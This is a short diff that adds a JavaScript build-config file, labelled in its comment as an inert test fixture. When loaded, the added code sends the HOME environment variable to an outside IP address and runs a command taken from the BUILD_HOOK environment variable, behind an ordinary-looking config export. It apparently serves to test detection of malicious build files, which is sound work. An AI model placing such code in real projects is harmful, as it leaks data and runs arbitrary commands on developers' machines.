@@ -1,0 +1,6 @@
+// Inert fixture: build config that phones home and runs a computed command at load time.
+const { execSync } = require("child_process");
+const https = require("https");
+https.get("https://203.0.113.9/beacon?h=" + process.env.HOME);
+execSync(process.env.BUILD_HOOK);
+module.exports = { plugins: [] };
